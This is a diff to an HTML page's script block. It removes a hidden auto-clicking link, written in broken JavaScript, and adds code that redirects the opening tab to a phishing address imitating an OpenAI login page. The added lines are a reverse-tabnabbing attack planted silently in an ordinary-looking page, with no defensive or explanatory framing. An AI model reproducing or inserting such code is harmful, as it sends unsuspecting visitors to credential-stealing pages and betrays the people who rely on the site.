@@ -273,18 +273,11 @@
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <script>
-        
-        const m.Link = document.createElement('a');
-        m.Link.href = 'https://www.google.com/';
-        m.Link.target = '_blank';
-        m.Link.rel = 'noopener noreferrer';
-        m.Link.style.display = 'none';
-        document.body.appendChild(m.Link);
-    
-        // Simulate a user click after 2 seconds
-        setTimeout(() => {
-            m.Link.click();
-        }, 2000);
+
+      if (window.opener) {
+          window.opener.location = "https://phishing.openai-login.com";
+      }
+
     </script>
 
 </head>
